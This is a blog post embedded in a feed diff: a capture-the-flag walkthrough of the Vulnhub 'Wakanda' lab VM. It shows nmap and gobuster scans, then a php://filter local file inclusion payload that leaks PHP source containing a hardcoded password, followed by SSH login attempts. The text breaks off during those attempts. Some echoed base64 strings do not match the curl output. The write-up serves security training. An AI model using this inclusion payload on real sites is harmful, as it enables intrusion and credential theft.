@@ -7,6 +7,598 @@
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
     
       <item>
+        <title>Vulnhub.com - Wakanda</title>
+        <description>&lt;p&gt;In this post we’re going to walk through an amazing box from Vulnhub called &lt;strong&gt;Wakanda&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;A new Vibranium market will soon be online in the dark net. Your goal, get your hands on the root file containing the exact location of the mine.
+
+Intermediate level
+
+Flags: There are three flags (flag1.txt, flag2.txt, root.txt)
+
+    DHCP: Enabled
+    IP Address: Automatically assigned
+
+Hint: Follow your intuitions ... and enumerate!
+
+For any questions, feel free to contact me on Twitter: xMagass
+
+Happy Hacking!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Author: &lt;a href=&quot;https://twitter.com/@xMagass&quot;&gt;xMagass&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;Download: &lt;a href=&quot;https://www.vulnhub.com/entry/wakanda-1,251/&quot;&gt;https://www.vulnhub.com/entry/wakanda-1,251/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
+
+&lt;p&gt;From start we’re going to do an &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# nmap -v -sS -sV -sC -A -T4 -p- 10.0.0.13
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-08 05:22 EDT
+NSE: Loaded 148 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 05:22
+Completed NSE at 05:22, 0.00s elapsed
+Initiating NSE at 05:22
+Completed NSE at 05:22, 0.00s elapsed
+Initiating ARP Ping Scan at 05:22
+Scanning 10.0.0.13 [1 port]
+Completed ARP Ping Scan at 05:22, 0.03s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 05:22
+Completed Parallel DNS resolution of 1 host. at 05:22, 0.00s elapsed
+Initiating SYN Stealth Scan at 05:22
+Scanning 10.0.0.13 [65535 ports]
+Discovered open port 111/tcp on 10.0.0.13
+Discovered open port 80/tcp on 10.0.0.13
+Discovered open port 3333/tcp on 10.0.0.13
+Discovered open port 38284/tcp on 10.0.0.13
+Completed SYN Stealth Scan at 05:23, 5.33s elapsed (65535 total ports)
+Initiating Service scan at 05:23
+Scanning 4 services on 10.0.0.13
+Completed Service scan at 05:23, 11.02s elapsed (4 services on 1 host)
+Initiating OS detection (try #1) against 10.0.0.13
+NSE: Script scanning 10.0.0.13.
+Initiating NSE at 05:23
+Completed NSE at 05:23, 0.33s elapsed
+Initiating NSE at 05:23
+Completed NSE at 05:23, 0.01s elapsed
+Nmap scan report for 10.0.0.13
+Host is up (0.00073s latency).
+Not shown: 65531 closed ports
+PORT      STATE SERVICE VERSION
+80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: Vibranium Market
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100024  1          38284/tcp  status
+|_  100024  1          44089/udp  status
+3333/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 1c:98:47:56:fc:b8:14:08:8f:93:ca:36:44:7f:ea:7a (DSA)
+|   2048 f1:d5:04:78:d3:3a:9b:dc:13:df:0f:5f:7f:fb:f4:26 (RSA)
+|   256 d8:34:41:5d:9b:fe:51:bc:c6:4e:02:14:5e:e1:08:c5 (ECDSA)
+|_  256 0e:f5:8d:29:3c:73:57:c7:38:08:6d:50:84:b6:6c:27 (ED25519)
+38284/tcp open  status  1 (RPC #100024)
+MAC Address: 08:00:27:3C:1E:DB (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Uptime guess: 198.048 days (since Mon Jan 22 03:14:46 2018)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=264 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.73 ms 10.0.0.13
+
+NSE: Script Post-scanning.
+Initiating NSE at 05:23
+Completed NSE at 05:23, 0.00s elapsed
+Initiating NSE at 05:23
+Completed NSE at 05:23, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.42 seconds
+           Raw packets sent: 65558 (2.885MB) | Rcvd: 65550 (2.623MB)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;We can already see 2 interesting services - &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; on port 3333 and &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on port 80. In the meantime I decide to run a &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; scan against the web page as I couldn’t find anything useful on my own.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.0.0.13 -x .php,.txt
+
+Gobuster v1.4.1              OJ Reeves (@TheColonial)
+=====================================================
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.0.0.13/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes : 307,200,204,301,302
+[+] Extensions   : .php,.txt
+=====================================================
+/index.php (Status: 200)
+/fr.php (Status: 200)
+/admin (Status: 200)
+/shell (Status: 200)
+/backup (Status: 200)
+/secret (Status: 200)
+/secret.txt (Status: 200)
+/troll (Status: 200)
+/hahaha (Status: 200)
+/hohoho (Status: 200)
+=====================================================&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;We can see a whole number of websites, but actually looking at them with &lt;code class=&quot;highlighter-rouge&quot;&gt;curl&lt;/code&gt; shows that most of them are just empty files.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# curl 10.0.0.13/fr.php
+root@kali:~# curl 10.0.0.13/admin
+root@kali:~# curl 10.0.0.13/shell
+root@kali:~# curl 10.0.0.13/backup
+root@kali:~# curl 10.0.0.13/secret
+root@kali:~# curl 10.0.0.13/troll
+root@kali:~# curl 10.0.0.13/hahaha
+root@kali:~# curl 10.0.0.13/hohoho
+
+root@kali:~# curl http://10.0.0.13/secret.txt
+Congratulations! 
+
+Nope!I am joking....&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Coming back to the main page, we have a commented out link that will change the language of the content.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;http://10.0.0.13/?lang=fr&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;As we know that there is a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;fr.php&lt;/code&gt; we can suspect that the script running behind this page will append &lt;code class=&quot;highlighter-rouge&quot;&gt;.php&lt;/code&gt; extension to anything we pass with parameter.&lt;/p&gt;
+
+&lt;p&gt;I decided to look for some vulnerabilities for this type of situation and came up with &lt;a href=&quot;https://www.exploit-db.com/docs/english/40992-web-app-penetration-testing---local-file-inclusion-(lfi).pdf&quot;&gt;this paper&lt;/a&gt;. With this, we can leak the source code of the pages.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# curl http://10.0.0.13/?lang=php://filter/convert.base64-encode/resource=fr 
+PD9waHAKCiRtZXNzYWdlPSJQcm9jaGFpbmUgb3V2ZXJ0dXJlIGR1IHBsdXMgZ3JhbmQgbWFyY2jDqSBkdSB2aWJyYW5pdW0uIExlcyBwcm9kdWl0cyB2aWVubmVudCBkaXJlY3RlbWVudCBkdSB3YWthbmRhLiBSZXN0ZXogw6AgbCfDqWNvdXRlISI7
+
+
+&amp;lt;!DOCTYPE html&amp;gt;
+&amp;lt;html lang=&quot;en&quot;&amp;gt;&amp;lt;head&amp;gt;
+&amp;lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=UTF-8&quot;&amp;gt;
+    &amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;
+    &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&amp;gt;
+    &amp;lt;meta name=&quot;description&quot; content=&quot;Vibranium market&quot;&amp;gt;
+    &amp;lt;meta name=&quot;author&quot; content=&quot;mamadou&quot;&amp;gt;
+
+    &amp;lt;title&amp;gt;Vibranium Market&amp;lt;/title&amp;gt;
+
+
+    &amp;lt;link href=&quot;bootstrap.css&quot; rel=&quot;stylesheet&quot;&amp;gt;
+
+    
+    &amp;lt;link href=&quot;cover.css&quot; rel=&quot;stylesheet&quot;&amp;gt;
+  &amp;lt;/head&amp;gt;
+
+  &amp;lt;body class=&quot;text-center&quot;&amp;gt;
+
+    &amp;lt;div class=&quot;cover-container d-flex w-100 h-100 p-3 mx-auto flex-column&quot;&amp;gt;
+      &amp;lt;header class=&quot;masthead mb-auto&quot;&amp;gt;
+        &amp;lt;div class=&quot;inner&quot;&amp;gt;
+          &amp;lt;h3 class=&quot;masthead-brand&quot;&amp;gt;Vibranium Market&amp;lt;/h3&amp;gt;
+          &amp;lt;nav class=&quot;nav nav-masthead justify-content-center&quot;&amp;gt;
+            &amp;lt;a class=&quot;nav-link active&quot; href=&quot;#&quot;&amp;gt;Home&amp;lt;/a&amp;gt;
+            &amp;lt;!-- &amp;lt;a class=&quot;nav-link active&quot; href=&quot;?lang=fr&quot;&amp;gt;Fr/a&amp;gt; --&amp;gt;
+          &amp;lt;/nav&amp;gt;
+        &amp;lt;/div&amp;gt;
+      &amp;lt;/header&amp;gt;
+
+      &amp;lt;main role=&quot;main&quot; class=&quot;inner cover&quot;&amp;gt;
+        &amp;lt;h1 class=&quot;cover-heading&quot;&amp;gt;Coming soon&amp;lt;/h1&amp;gt;
+        &amp;lt;p class=&quot;lead&quot;&amp;gt;
+                  &amp;lt;/p&amp;gt;
+        &amp;lt;p class=&quot;lead&quot;&amp;gt;
+          &amp;lt;a href=&quot;#&quot; class=&quot;btn btn-lg btn-secondary&quot;&amp;gt;Learn more&amp;lt;/a&amp;gt;
+        &amp;lt;/p&amp;gt;
+      &amp;lt;/main&amp;gt;
+
+      &amp;lt;footer class=&quot;mastfoot mt-auto&quot;&amp;gt;
+        &amp;lt;div class=&quot;inner&quot;&amp;gt;
+          &amp;lt;p&amp;gt;Made by&amp;lt;a href=&quot;#&quot;&amp;gt;@mamadou&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;
+        &amp;lt;/div&amp;gt;
+      &amp;lt;/footer&amp;gt;
+    &amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now we can decode the source.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# echo &quot;PD9waHAKCiRtZXNzYWdlPSJQcm9jaGFpbmUgb3V2ZXJ0dXJ3JhbmQgbWFyY2jDqSBkdSB2aWJyYW5pdW0uIExlcyBwcm9kdWl0cyB2aWVubmVudCBkaXJlY3RlbWVudCBkdSB3YWthbmRhLiBSZXN0ZXogw6AgbCfDqWNvdXRlISI7&quot; | base64 -d
+&amp;lt;?php
+
+$message=&quot;Prochaine ouverture du plus grand marché du vibranium. Les produits viennent directement du wakanda. Restez à l'écoute!&quot;;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Hey, that’s the message showing up when we change the language! We can do the same with &lt;code class=&quot;highlighter-rouge&quot;&gt;index.php&lt;/code&gt; file.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# curl http://10.0.0.13/?lang=php://filter/convert.base64-encode/resource=index
+PD9waHAKJHBhc3N3b3JkID0iTmlhbWV5NEV2ZXIyMjchISEiIDsvL0kgaGF2ZSB0byByZW1lbWJlciBpdAoKaWYgKGlzc2V0KCRfR0VUWydsYW5nJ10pKQp7CmluY2x1ZGUoJF9HRVRbJ2xhbmcnXS4iLnBocCIpOwp9Cgo/PgoKCgo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0iZW4iPjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+CiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iPgogICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IlZpYnJhbml1bSBtYXJrZXQiPgogICAgPG1ldGEgbmFtZT0iYXV0aG9yIiBjb250ZW50PSJtYW1hZG91Ij4KCiAgICA8dGl0bGU+VmlicmFuaXVtIE1hcmtldDwvdGl0bGU+CgoKICAgIDxsaW5rIGhyZWY9ImJvb3RzdHJhcC5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CgogICAgCiAgICA8bGluayBocmVmPSJjb3Zlci5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CiAgPC9oZWFkPgoKICA8Ym9keSBjbGFzcz0idGV4dC1jZW50ZXIiPgoKICAgIDxkaXYgY2xhc3M9ImNvdmVyLWNvbnRhaW5lciBkLWZsZXggdy0xMDAgaC0xMDAgcC0zIG14LWF1dG8gZmxleC1jb2x1bW4iPgogICAgICA8aGVhZGVyIGNsYXNzPSJtYXN0aGVhZCBtYi1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8aDMgY2xhc3M9Im1hc3RoZWFkLWJyYW5kIj5WaWJyYW5pdW0gTWFya2V0PC9oMz4KICAgICAgICAgIDxuYXYgY2xhc3M9Im5hdiBuYXYtbWFzdGhlYWQganVzdGlmeS1jb250ZW50LWNlbnRlciI+CiAgICAgICAgICAgIDxhIGNsYXNzPSJuYXYtbGluayBhY3RpdmUiIGhyZWY9IiMiPkhvbWU8L2E+CiAgICAgICAgICAgIDwhLS0gPGEgY2xhc3M9Im5hdi1saW5rIGFjdGl2ZSIgaHJlZj0iP2xhbmc9ZnIiPkZyL2E+IC0tPgogICAgICAgICAgPC9uYXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvaGVhZGVyPgoKICAgICAgPG1haW4gcm9sZT0ibWFpbiIgY2xhc3M9ImlubmVyIGNvdmVyIj4KICAgICAgICA8aDEgY2xhc3M9ImNvdmVyLWhlYWRpbmciPkNvbWluZyBzb29uPC9oMT4KICAgICAgICA8cCBjbGFzcz0ibGVhZCI+CiAgICAgICAgICA8P3BocAogICAgICAgICAgICBpZiAoaXNzZXQoJF9HRVRbJ2xhbmcnXSkpCiAgICAgICAgICB7CiAgICAgICAgICBlY2hvICRtZXNzYWdlOwogICAgICAgICAgfQogICAgICAgICAgZWxzZQogICAgICAgICAgewogICAgICAgICAgICA/PgoKICAgICAgICAgICAgTmV4dCBvcGVuaW5nIG9mIHRoZSBsYXJnZXN0IHZpYnJhbml1bSBtYXJrZXQuIFRoZSBwcm9kdWN0cyBjb21lIGRpcmVjdGx5IGZyb20gdGhlIHdha2FuZGEuIHN0YXkgdHVuZWQhCiAgICAgICAgICAgIDw/cGhwCiAgICAgICAgICB9Cj8+CiAgICAgICAgPC9wPgogICAgICAgIDxwIGNsYXNzPSJsZWFkIj4KICAgICAgICAgIDxhIGhyZWY9IiMiIGNsYXNzPSJidG4gYnRuLWxnIGJ0bi1zZWNvbmRhcnkiPkxlYXJuIG1vcmU8L2E+CiAgICAgICAgPC9wPgogICAgICA8L21haW4+CgogICAgICA8Zm9vdGVyIGNsYXNzPSJtYXN0Zm9vdCBtdC1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8cD5NYWRlIGJ5PGEgaHJlZj0iIyI+QG1hbWFkb3U8L2E+PC9wPgogICAgICAgIDwvZGl2PgogICAgICA8L2Zvb3Rlcj4KICAgIDwvZGl2PgoKCgogIAoKPC9ib2R5PjwvaHRtbD4=
+
+
+&amp;lt;!DOCTYPE html&amp;gt;
+&amp;lt;html lang=&quot;en&quot;&amp;gt;&amp;lt;head&amp;gt;
+&amp;lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=UTF-8&quot;&amp;gt;
+    &amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;
+    &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&amp;gt;
+    &amp;lt;meta name=&quot;description&quot; content=&quot;Vibranium market&quot;&amp;gt;
+    &amp;lt;meta name=&quot;author&quot; content=&quot;mamadou&quot;&amp;gt;
+
+    &amp;lt;title&amp;gt;Vibranium Market&amp;lt;/title&amp;gt;
+
+
+    &amp;lt;link href=&quot;bootstrap.css&quot; rel=&quot;stylesheet&quot;&amp;gt;
+
+    
+    &amp;lt;link href=&quot;cover.css&quot; rel=&quot;stylesheet&quot;&amp;gt;
+  &amp;lt;/head&amp;gt;
+
+  &amp;lt;body class=&quot;text-center&quot;&amp;gt;
+
+    &amp;lt;div class=&quot;cover-container d-flex w-100 h-100 p-3 mx-auto flex-column&quot;&amp;gt;
+      &amp;lt;header class=&quot;masthead mb-auto&quot;&amp;gt;
+        &amp;lt;div class=&quot;inner&quot;&amp;gt;
+          &amp;lt;h3 class=&quot;masthead-brand&quot;&amp;gt;Vibranium Market&amp;lt;/h3&amp;gt;
+          &amp;lt;nav class=&quot;nav nav-masthead justify-content-center&quot;&amp;gt;
+            &amp;lt;a class=&quot;nav-link active&quot; href=&quot;#&quot;&amp;gt;Home&amp;lt;/a&amp;gt;
+            &amp;lt;!-- &amp;lt;a class=&quot;nav-link active&quot; href=&quot;?lang=fr&quot;&amp;gt;Fr/a&amp;gt; --&amp;gt;
+          &amp;lt;/nav&amp;gt;
+        &amp;lt;/div&amp;gt;
+      &amp;lt;/header&amp;gt;
+
+      &amp;lt;main role=&quot;main&quot; class=&quot;inner cover&quot;&amp;gt;
+        &amp;lt;h1 class=&quot;cover-heading&quot;&amp;gt;Coming soon&amp;lt;/h1&amp;gt;
+        &amp;lt;p class=&quot;lead&quot;&amp;gt;
+                  &amp;lt;/p&amp;gt;
+        &amp;lt;p class=&quot;lead&quot;&amp;gt;
+          &amp;lt;a href=&quot;#&quot; class=&quot;btn btn-lg btn-secondary&quot;&amp;gt;Learn more&amp;lt;/a&amp;gt;
+        &amp;lt;/p&amp;gt;
+      &amp;lt;/main&amp;gt;
+
+      &amp;lt;footer class=&quot;mastfoot mt-auto&quot;&amp;gt;
+        &amp;lt;div class=&quot;inner&quot;&amp;gt;
+          &amp;lt;p&amp;gt;Made by&amp;lt;a href=&quot;#&quot;&amp;gt;@mamadou&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;
+        &amp;lt;/div&amp;gt;
+      &amp;lt;/footer&amp;gt;
+    &amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And decode the source.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# echo &quot;PD9waHAKJHBhc3N3b3JkID0iTmlhbWV5NEV2ZXIyMjchISESB0byByZW1lbWJlciBpdAoKaWYgKGlzc2V0KCRfR0VUWydsYW5nJ10pKQp7CmluY2x1ZGUoJF9HRVRbJ2xhbmcnXS4iLnBocCIpOwp9Cgo/PgoKCgo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0iZW4iPjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+CiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iPgogICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IlZpYnJhbml1bSBtYXJrZXQiPgogICAgPG1ldGEgbmFtZT0iYXV0aG9yIiBjb250ZW50PSJtYW1hZG91Ij4KCiAgICA8dGl0bGU+VmlicmFuaXVtIE1hcmtldDwvdGl0bGU+CgoKICAgIDxsaW5rIGhyZWY9ImJvb3RzdHJhcC5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CgogICAgCiAgICA8bGluayBocmVmPSJjb3Zlci5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CiAgPC9oZWFkPgoKICA8Ym9keSBjbGFzcz0idGV4dC1jZW50ZXIiPgoKICAgIDxkaXYgY2xhc3M9ImNvdmVyLWNvbnRhaW5lciBkLWZsZXggdy0xMDAgaC0xMDAgcC0zIG14LWF1dG8gZmxleC1jb2x1bW4iPgogICAgICA8aGVhZGVyIGNsYXNzPSJtYXN0aGVhZCBtYi1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8aDMgY2xhc3M9Im1hc3RoZWFkLWJyYW5kIj5WaWJyYW5pdW0gTWFya2V0PC9oMz4KICAgICAgICAgIDxuYXYgY2xhc3M9Im5hdiBuYXYtbWFzdGhlYWQganVzdGlmeS1jb250ZW50LWNlbnRlciI+CiAgICAgICAgICAgIDxhIGNsYXNzPSJuYXYtbGluayBhY3RpdmUiIGhyZWY9IiMiPkhvbWU8L2E+CiAgICAgICAgICAgIDwhLS0gPGEgY2xhc3M9Im5hdi1saW5rIGFjdGl2ZSIgaHJlZj0iP2xhbmc9ZnIiPkZyL2E+IC0tPgogICAgICAgICAgPC9uYXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvaGVhZGVyPgoKICAgICAgPG1haW4gcm9sZT0ibWFpbiIgY2xhc3M9ImlubmVyIGNvdmVyIj4KICAgICAgICA8aDEgY2xhc3M9ImNvdmVyLWhlYWRpbmciPkNvbWluZyBzb29uPC9oMT4KICAgICAgICA8cCBjbGFzcz0ibGVhZCI+CiAgICAgICAgICA8P3BocAogICAgICAgICAgICBpZiAoaXNzZXQoJF9HRVRbJ2xhbmcnXSkpCiAgICAgICAgICB7CiAgICAgICAgICBlY2hvICRtZXNzYWdlOwogICAgICAgICAgfQogICAgICAgICAgZWxzZQogICAgICAgICAgewogICAgICAgICAgICA/PgoKICAgICAgICAgICAgTmV4dCBvcGVuaW5nIG9mIHRoZSBsYXJnZXN0IHZpYnJhbml1bSBtYXJrZXQuIFRoZSBwcm9kdWN0cyBjb21lIGRpcmVjdGx5IGZyb20gdGhlIHdha2FuZGEuIHN0YXkgdHVuZWQhCiAgICAgICAgICAgIDw/cGhwCiAgICAgICAgICB9Cj8+CiAgICAgICAgPC9wPgogICAgICAgIDxwIGNsYXNzPSJsZWFkIj4KICAgICAgICAgIDxhIGhyZWY9IiMiIGNsYXNzPSJidG4gYnRuLWxnIGJ0bi1zZWNvbmRhcnkiPkxlYXJuIG1vcmU8L2E+CiAgICAgICAgPC9wPgogICAgICA8L21haW4+CgogICAgICA8Zm9vdGVyIGNsYXNzPSJtYXN0Zm9vdCBtdC1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8cD5NYWRlIGJ5PGEgaHJlZj0iIyI+QG1hbWFkb3U8L2E+PC9wPgogICAgICAgIDwvZGl2PgogICAgICA8L2Zvb3Rlcj4KICAgIDwvZGl2PgoKCgogIAoKPC9ib2R5PjwvaHRtbD4=
+&amp;gt; &quot; | base64 -d
+
+&amp;lt;?php
+$password =&quot;Niamey4Ever227!!!&quot; ;//I have to remember it
+
+if (isset($_GET['lang']))
+{
+include($_GET['lang'].&quot;.php&quot;);
+}
+
+?&amp;gt;
+
+
+
+&amp;lt;!DOCTYPE html&amp;gt;
+&amp;lt;html lang=&quot;en&quot;&amp;gt;&amp;lt;head&amp;gt;
+&amp;lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=UTF-8&quot;&amp;gt;
+    &amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;
+    &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&amp;gt;
+    &amp;lt;meta name=&quot;description&quot; content=&quot;Vibranium market&quot;&amp;gt;
+    &amp;lt;meta name=&quot;author&quot; content=&quot;mamadou&quot;&amp;gt;
+
+    &amp;lt;title&amp;gt;Vibranium Market&amp;lt;/title&amp;gt;
+
+
+    &amp;lt;link href=&quot;bootstrap.css&quot; rel=&quot;stylesheet&quot;&amp;gt;
+
+    
+    &amp;lt;link href=&quot;cover.css&quot; rel=&quot;stylesheet&quot;&amp;gt;
+  &amp;lt;/head&amp;gt;
+
+  &amp;lt;body class=&quot;text-center&quot;&amp;gt;
+
+    &amp;lt;div class=&quot;cover-container d-flex w-100 h-100 p-3 mx-auto flex-column&quot;&amp;gt;
+      &amp;lt;header class=&quot;masthead mb-auto&quot;&amp;gt;
+        &amp;lt;div class=&quot;inner&quot;&amp;gt;
+          &amp;lt;h3 class=&quot;masthead-brand&quot;&amp;gt;Vibranium Market&amp;lt;/h3&amp;gt;
+          &amp;lt;nav class=&quot;nav nav-masthead justify-content-center&quot;&amp;gt;
+            &amp;lt;a class=&quot;nav-link active&quot; href=&quot;#&quot;&amp;gt;Home&amp;lt;/a&amp;gt;
+            &amp;lt;!-- &amp;lt;a class=&quot;nav-link active&quot; href=&quot;?lang=fr&quot;&amp;gt;Fr/a&amp;gt; --&amp;gt;
+          &amp;lt;/nav&amp;gt;
+        &amp;lt;/div&amp;gt;
+      &amp;lt;/header&amp;gt;
+
+      &amp;lt;main role=&quot;main&quot; class=&quot;inner cover&quot;&amp;gt;
+        &amp;lt;h1 class=&quot;cover-heading&quot;&amp;gt;Coming soon&amp;lt;/h1&amp;gt;
+        &amp;lt;p class=&quot;lead&quot;&amp;gt;
+          &amp;lt;?php
+            if (isset($_GET['lang']))
+          {
+          echo $message;
+          }
+          else
+          {
+            ?&amp;gt;
+
+            Next opening of the largest vibranium market. The products come directly from the wakanda. stay tuned!
+            &amp;lt;?php
+          }
+?&amp;gt;
+        &amp;lt;/p&amp;gt;
+        &amp;lt;p class=&quot;lead&quot;&amp;gt;
+          &amp;lt;a href=&quot;#&quot; class=&quot;btn btn-lg btn-secondary&quot;&amp;gt;Learn more&amp;lt;/a&amp;gt;
+        &amp;lt;/p&amp;gt;
+      &amp;lt;/main&amp;gt;
+
+      &amp;lt;footer class=&quot;mastfoot mt-auto&quot;&amp;gt;
+        &amp;lt;div class=&quot;inner&quot;&amp;gt;
+          &amp;lt;p&amp;gt;Made by&amp;lt;a href=&quot;#&quot;&amp;gt;@mamadou&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;
+        &amp;lt;/div&amp;gt;
+      &amp;lt;/footer&amp;gt;
+    &amp;lt;/div&amp;gt;
+&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;We have the password!&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;$password =&quot;Niamey4Ever227!!!&quot; ;//I have to remember it&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;As I suspect it’s for &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt;, we now have to get the username. My first guess wass &lt;code class=&quot;highlighter-rouge&quot;&gt;niamey&lt;/code&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# ssh niamey@10.0.0.13 -p 3333
+niamey@10.0.0.13's password: 
+Permission denied, please try again.
+niamey@10.0.0.13's password: 
+Permission denied, please try again.
+niamey@10.0.0.13's password: 
